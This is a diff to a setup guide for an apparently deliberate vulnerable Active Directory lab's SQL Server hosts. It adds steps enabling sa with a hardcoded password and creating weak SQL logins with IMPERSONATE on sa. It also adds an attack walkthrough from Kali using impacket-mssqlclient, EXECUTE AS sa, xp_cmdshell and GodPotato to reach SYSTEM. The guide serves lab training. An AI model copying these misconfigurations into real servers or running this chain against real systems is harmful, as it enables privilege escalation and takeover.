@@ -1,6 +1,8 @@
 # SQL Integration Guide
 
-SQL Server is a **manual install** in CADRE (not automated by the playbooks). After installing, the playbook `ansible/playbooks/09-sql-wsus-verify.yml` confirms every setting below. This guide lists exactly what to install and configure on each host so that verification passes.
+SQL Server is a **manual install** in CADRE (not automated by the playbooks). After installing and configuring per this guide, the verify playbook `ansible/playbooks/09-sql-wsus-verify.yml` **confirms** settings — it does not create them. Playbooks were updated **after** manual setup to reflect the live lab.
+
+This guide lists exactly what to install and configure on each host so that verification passes.
 
 CADRE uses SQL on **three** hosts:
 
@@ -25,6 +27,23 @@ Download **SQL Server 2022 Express** (`SQL2022-SSEI-Expr.exe`), run it, choose *
 # mixed-mode auth so 'sa' works, set the sa password
 # (Custom install: enable SQL+Windows auth, set sa = s@_P@ssw0rd!L@b!)
 Install-Module SqlServer -Force        # provides Invoke-Sqlcmd
+```
+
+**Enable mixed mode auth** (required for SQL auth from non-domain-joined machines):
+
+```powershell
+# Find instance ID
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
+# Returns: SQLEXPRESS : MSSQL16.SQLEXPRESS
+
+# Enable mixed mode (LoginMode=2)
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQLServer" -Name "LoginMode" -Value 2
+
+# Restart SQL
+Restart-Service 'MSSQL$SQLEXPRESS' -Force
+
+# Enable SA login
+sqlcmd -S "localhost\SQLEXPRESS" -E -Q "ALTER LOGIN sa ENABLE; ALTER LOGIN sa WITH PASSWORD = 's@_P@ssw0rd!L@b!';"
 ```
 
 ### 1.2 Enable xp_cmdshell  *(WT#41)*
@@ -52,6 +71,32 @@ Grant a low-priv login the ability to `EXECUTE AS LOGIN='sa'` (the impersonation
 GRANT IMPERSONATE ON LOGIN::sa TO [CHILD\analyst_t1];
 ```
 (The verify check looks for any IMPERSONATE grant where the grantor is `sa` (principal id 1).)
+
+### 1.5 SQL Logins for attack path  *(WT#43/44)*
+SQL logins enable the attack chain from non-domain-joined machines (e.g., Kali). Without these, the attacker needs Windows auth (domain-joined machine) to connect.
+
+```sql
+-- Create SQL logins
+CREATE LOGIN [svc_mssql] WITH PASSWORD = 's3rv1c3_MSSQL!';
+CREATE LOGIN [analyst_t1] WITH PASSWORD = 'T13r_An@lyst!';
+
+-- Grant IMPERSONATE on sa to analyst_t1 SQL login
+GRANT IMPERSONATE ON LOGIN::sa TO [analyst_t1];
+```
+
+**Attack chain from Kali (no domain join needed):**
+```bash
+# Connect as svc_mssql — discover IMPERSONATE
+impacket-mssqlclient 'svc_mssql:s3rv1c3_MSSQL!@192.168.77.22'
+
+# Connect as analyst_t1 — impersonate sa
+impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
+
+# In SQL prompt:
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell 'whoami';           -- nt service\mssql$sqlexpress
+EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';  -- nt authority\system
+```
 
 ---
 
